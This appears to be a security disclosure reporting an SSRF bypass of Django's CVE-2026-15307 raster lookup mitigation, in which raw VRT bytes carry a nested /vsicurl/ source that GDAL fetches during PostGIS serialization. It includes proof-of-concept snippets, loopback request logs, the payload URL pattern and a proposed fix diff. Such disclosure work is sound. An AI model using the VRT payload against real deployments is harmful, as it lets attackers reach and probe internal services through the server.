# VRT raster bytes bypass CVE-2026-15307 mitigation and trigger SSRF during PostGIS spatial lookup serialization

## Summary

Django's mitigation for CVE-2026-15307 blocks `str`, `pathlib.Path`, and `dict` raster lookup values because GDAL may use them to access files or the network.

However, the mitigation intentionally continues to allow raw `bytes`. Django's GeoDjango security documentation states that bytes are accepted without explicit `GDALRaster(...)` wrapping because they are opened through the memory-backed `/vsimem/` filesystem.

That assumption is unsafe for container formats such as GDAL VRT.

A VRT document supplied as raw bytes is first stored in `/vsimem/`, but the VRT itself can contain a `<SourceFilename>` referencing another GDAL virtual filesystem such as:

```
/vsicurl/http://127.0.0.1:18765/source.tif
```

Django accepts the bytes through the CVE-2026-15307 lookup guard, constructs a `GDALRaster`, and later the normal PostGIS raster adapter reads the VRT band while serializing the lookup value. GDAL then dereferences the nested `/vsicurl/` URL and performs an outbound HTTP request as the Django process.

I reproduced both:

1. successful SSRF where the target returns a valid raster, and
2. blind SSRF where the target returns non-raster content and serialization fails only **after** the outbound request has already occurred.

The input can come directly from Django's normal `HttpRequest.body`, which is a `bytes` object.

This appears to bypass the security boundary introduced for CVE-2026-15307.

## Affected versions / branches

The unsafe bytes exception is present in:

- `stable/5.2.x`
- `stable/6.0.x`
- `stable/6.1.x`
- current Django main was also dynamically reproduced at commit `9e06baf2e4dd17834b5deaf3a3e6ae3bff2fcf26`

The corresponding security documentation on the supported branches explicitly says bytes remain accepted because they use `/vsimem/`.

## Root cause

The CVE-2026-15307 guard only rejects values normalized to `dict` or `str`:

```python
@classmethod
def check_raster_lookup_value(cls, ds_input):
    normalized = cls._preprocess_input(ds_input)
    if isinstance(normalized, (dict, str)):
        raise DisallowedRasterLookup(...)
```

Raw bytes therefore pass the security gate.

`GDALRaster.__init__()` stores byte input into a random `/vsimem/` path and opens it through GDAL:

```python
elif isinstance(ds_input, bytes):
    self._write = 1
    ...
    vsi_path = os.path.join(VSI_MEM_FILESYSTEM_BASE_PATH, str(uuid.uuid4()))
    capi.create_vsi_file_from_mem_buffer(...)
    self._ptr = capi.open_ds(force_bytes(vsi_path), self._write)
```

The outer file being in `/vsimem/` does not mean the file's contents are isolated from other GDAL VSI handlers. A VRT can reference a nested `/vsicurl/` source.

During a PostGIS lookup, Django's `PostGISAdapter` converts the raster to PostGIS raster bytes. This reads raster band data, causing GDAL to resolve the nested VRT source and issue the network request.

## Request-facing reproduction

The PoC constructs an ordinary Django request:

```python
request = RequestFactory().post(
    "/lookup",
    data=vrt,
    content_type="application/octet-stream",
)
attacker_bytes = request.body
```

The type is normal Django request data:

```
REQUEST_BODY_TYPE= bytes
```

The security gate accepts it:

```python
GDALRaster.check_raster_lookup_value(attacker_bytes)
```

Output:

```
CHECK_RASTER_LOOKUP_VALUE=ALLOWED_REQUEST_BODY_BYTES
```

The normal raster lookup preparation path recognizes the bytes as VRT:

```python
field = RasterField(srid=4326)
prepared = field.get_prep_value(attacker_bytes)
```

Output:

```
PREPARED_DRIVER= VRT
HITS_AFTER_PREP= []
```

No network request is needed merely to parse the outer in-memory VRT.

The normal PostGIS adapter then serializes the raster:

```python
adapter = PostGISAdapter(prepared)
_ = adapter.ewkb
```

At that point GDAL dereferences the VRT source. In the successful-target control, the loopback server observes:

```
HTTP_HITS= [
  ('HEAD', '/source.tif'),
  ('GET', '/source.tif'),
  ...
]
SUCCESSFUL_TARGET_SSRF=CONFIRMED
```

## Blind SSRF

The PoC also points the VRT at a loopback endpoint that returns:

```
Content-Type: text/plain

not-a-raster
```

The target is still contacted before GDAL rejects the content:

```
BLIND_TARGET_HTTP_HITS= [
  ('HEAD', '/not-a-raster'),
  ('GET', '/not-a-raster'),
  ...
]
BLIND_SSRF=CONFIRMED
```

This means the attacker does not need to control a valid raster server. The primitive can cause requests to arbitrary HTTP endpoints reachable by the Django process.

All testing uses a loopback HTTP server controlled by the PoC.

## Reproduction artifacts

Repository:

`NightVibes33/Test`

Branch:

`h1-django-gdal-vrt-bytes-ssrf`

Standalone PoC:

`django-gdal-vrt-bytes-ssrf.py`

Workflow:

`.github/workflows/django-gdal-vrt-bytes-ssrf.yml`

Proposed fix:

`django-gdal-vrt-bytes-proposed-fix.diff`

Initial current-main workflow run that confirmed outbound VRT requests:

`36350406196`

Observed output:

```
CHECK_RASTER_LOOKUP_VALUE=ALLOWED_BYTES
PREPARED_DRIVER= VRT
HITS_AFTER_PREP= []
ADAPTER_BYTES= 64
HTTP_HITS= [('HEAD', '/source.tif'), ('GET', '/source.tif'), ...]
POC_RESULT=SSRF_CONFIRMED
```

## Why this bypasses the CVE-2026-15307 mitigation

The security fix intentionally distinguishes trusted raster construction from untrusted spatial lookup values.

The documented rule is:

- potentially dangerous `str`, `Path`, and `dict` values must be explicitly wrapped in `GDALRaster(...)`;
- raw bytes do **not** require that trust opt-in because Django assumes `/vsimem/` confines them.

VRT bytes violate that assumption. Although the outer VRT is stored in `/vsimem/`, it can tell GDAL to fetch an external source through `/vsicurl/`.

Therefore raw bytes can regain the same network-request capability that CVE-2026-15307 attempted to remove from untrusted spatial lookup values.

## Impact

An application that treats raw byte raster input as safe based on Django's post-CVE behavior/documentation and supplies attacker-controlled bytes to a GeoDjango spatial lookup can be made to issue server-side HTTP requests.

Depending on network access available to the Django process, this can be used to:

- reach internal HTTP services unavailable to the attacker,
- probe internal hosts and ports through blind SSRF behavior,
- send requests to loopback or other server-reachable addresses,
- interact with HTTP endpoints using the Django server's network position.

This report does not rely on contacting any third-party or cloud metadata service; the proof uses loopback only.

## Suggested fix

Remove the implicit trust exception for raw bytes in spatial lookup contexts.

For example:

```diff
- if isinstance(normalized, (dict, str)):
+ if isinstance(normalized, (bytes, dict, str)):
      raise DisallowedRasterLookup(...)
```

Applications that intentionally need binary raster lookups can explicitly construct `GDALRaster(bytes_value)`, matching the opt-in model already used for dangerous string/dictionary raster sources.

A regression test should include VRT bytes containing a `/vsicurl/` `SourceFilename` and verify that the lookup guard rejects the bytes before GDAL can dereference the nested source.

## Weakness

Server-Side Request Forgery (SSRF), CWE-918.
